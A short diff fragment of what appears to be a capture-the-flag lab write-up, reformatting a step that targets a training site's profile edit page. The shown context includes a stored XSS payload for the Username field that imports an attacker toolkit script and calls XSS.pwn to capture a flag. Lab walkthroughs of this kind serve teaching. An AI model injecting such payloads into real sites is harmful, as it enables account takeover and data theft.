@@ -427,7 +427,11 @@ We now have everything needed for the flag attempt:
 
 We'll reuse the `XSS.pwn()` technique that successfully captured the Task 2 flag.
 
-On `http://web0x0c.hbtn/profile/edit`, replace the Username field with:
+On
+
+`http://web0x0c.hbtn/profile/edit`
+
+replace the Username field with:
 
 ```
 <img src=x onerror="import('/attacker/toolkit.js').then(()=>XSS.pwn(5,3,'/profile/api/track'))">
